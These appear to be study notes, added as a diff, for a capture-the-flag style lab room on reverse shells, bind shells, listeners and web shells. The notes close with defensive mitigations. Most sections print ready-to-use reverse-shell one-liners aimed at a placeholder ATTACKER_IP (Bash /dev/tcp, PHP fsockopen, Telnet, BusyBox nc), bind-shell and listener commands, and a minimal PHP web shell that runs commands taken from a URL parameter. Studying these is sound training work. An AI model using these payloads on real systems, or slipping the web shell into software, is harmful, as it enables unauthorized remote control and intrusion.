@@ -1,1 +1,171 @@
 # Room 36 Shells Overview
+
+## Task 1 Room Introduction
+
+Objective: Identify fundamentals of shells in cybersecurity.
+Shells are widely used by attackers to remotely control systems, making them a critical part of the attack chain.
+This room explores different types of shells, their differences, and use cases.
+Learning goals:
+- Understand shells in offensive security.
+- Set up and use reverse and bind shells.
+- Deploy web shells.
+Room prerequisites:
+- Basic networking knowledge.
+- Fundamentals of web application security.
+- Command line proficiency.
+- Familiarity with scripting languages (Bash, Python, PHP).
+Caveats:
+- Metasploit and other frameworks are excluded to focus on manual understanding.
+- Linux OS is used for all examples.
+
+---
+
+## Task 2 Shell Overview
+
+Objective: Understand what a shell is and its role in attacks.
+A shell is software that allows interaction with an OS, usually via command line.
+In cybersecurity, it refers to sessions attackers use to control compromised systems.
+Use cases:
+- Remote system control.
+- Privilege escalation.
+- Data exfiltration.
+- Persistence and maintaining access.
+- Post-exploitation activities (malware deployment, hidden accounts).
+- Pivoting to other systems in the network.
+
+---
+
+## Task 3 Reverse Shell
+
+Objective: Learn how reverse shells work.
+A reverse shell (connect-back shell) initiates connections from the target system to the attacker’s machine, 
+often bypassing firewalls.
+Netcat Listener Example:
+Code
+- nc -lvnp 443
+Reverse Shell Payload Example:
+Code
+- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+Result:  
+- Attacker receives interactive shell access from compromised target.
+
+---
+
+## Task 4 Bind Shell
+
+Objective: Understand how bind shells work.
+Bind shells bind a port on the compromised system and listen for incoming connections.
+Bind Shell Payload Example:
+Code
+- rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+Attacker Connection Command:
+Code
+- nc -nv TARGET_IP 8080
+Result:  
+- Attacker connects and receives shell access remotely.
+
+---
+
+## Task 5 Shell Listeners
+
+Objective: Explore tools used as listeners for shells.
+Rlwrap:
+Code
+- rlwrap nc -lvnp 443
+Ncat:
+Code
+- ncat -lvnp 4444
+ncat --ssl -lvnp 4444
+Socat:
+Code
+- socat -d -d TCP-LISTEN:443 STDOUT
+
+---
+
+## Task 6 Shell Payloads
+
+Objective: Explore different shell payloads in Linux and other languages.
+Bash Payloads:
+- Normal Bash Reverse Shell: bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+- Bash Read Line Reverse Shell: exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+- Bash FD 196 Reverse Shell: 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+- Bash FD 5 Reverse Shell: bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+PHP Payloads:
+- Using exec: php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+- Using shell_exec: php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+- Using system: php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+- Using passthru: php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+- Using popen: php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3","r");'
+Python Payloads:
+- Env variables: python -c 'import sys,socket,os,pty; ...'
+- Subprocess: python -c 'import socket,subprocess,os; ...'
+- Short reverse shell: python -c 'import os,pty,socket; ...'
+Others:
+- Telnet: TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+- AWK: awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443"; ...}' /dev/null
+- BusyBox: busybox nc ATTACKER_IP 443 -e sh
+
+---
+
+## Task 7 Web Shell
+
+Objective: Understand web shells and their use cases.
+Web shells are scripts written in languages supported by web servers (PHP, ASP, JSP, CGI).
+Example PHP Web Shell:
+php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+Access via URL:
+Code
+- http://victim.com/uploads/shell.php?cmd=whoami
+Popular Web Shells:
+p0wny-shell → minimalistic PHP shell.
+b374k shell → feature-rich with file management.
+c99 shell → robust with extensive functionality.
+
+---
+
+## Task 8 Practical Task
+
+Objective: Apply knowledge in a lab environment.
+Start AttackBox and Lab Machine.
+Challenge: obtain flag THM{} from vulnerable web server.
+Services:
+- MACHINE_IP:8080 → landing page.
+- MACHINE_IP:8081 → vulnerable to command injection.
+- MACHINE_IP:8082 → vulnerable to unrestricted file upload.
+
+---
+
+## Tools Used
+
+- Netcat, Ncat, Socat, Rlwrap.
+- Bash, PHP, Python, Telnet, AWK, BusyBox.
+- Web shells (p0wny, b374k, c99).
+- Linux OS for examples.
+
+## Findings
+
+- Reverse shells bypass outbound restrictions; bind shells bypass inbound restrictions.
+- Payloads exist in multiple languages, increasing attacker flexibility.
+- Web shells exploit server-side vulnerabilities and provide persistent access.
+- Listener utilities enhance usability and stealth.
+
+## Mitigation / Best Practices
+
+- Monitor inbound/outbound traffic for anomalies.
+- Restrict unnecessary ports and services.
+- Harden web applications against file upload and command injection.
+- Use IDS/IPS to detect shell payloads.
+- Apply least privilege and patch vulnerabilities.
+- Segment networks to reduce pivoting opportunities.
+
+## Conclusion
+
+- Shells are fundamental in offensive security and post-exploitation.
+- Reverse shells, bind shells, payloads, and web shells demonstrate attacker versatility.
+- Practical exercises reinforce detection and mitigation strategies.
+- Understanding shells equips defenders to anticipate attacker techniques and strengthen system security.
